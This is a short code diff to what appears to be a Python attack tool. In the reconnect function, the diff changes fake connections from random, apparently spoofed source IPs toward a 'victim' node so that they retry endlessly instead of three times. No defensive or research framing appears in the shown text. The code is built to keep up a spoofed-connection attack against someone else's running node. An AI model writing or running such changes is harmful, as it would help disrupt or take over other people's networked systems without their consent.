@@ -252,7 +252,8 @@ def reconnect(the_socket, other_socket, src_ip, src_port, dst_ip, dst_port, inte
 	close_connection(other_socket, the_socket, dst_ip, dst_port, interface)
 	#make_fake_connection(src_ip = random_ip(), dst_ip, verbose=True, attempt_number = 3)
 	try:
-		make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = True, attempt_number = 3)
+		# With attempt_number == -1, it will retry to connect infinitely
+		make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = True, attempt_number = -1)
 	except ConnectionRefusedError:
 		print('Connection was refused. The victim\'s node must not be running.')
 
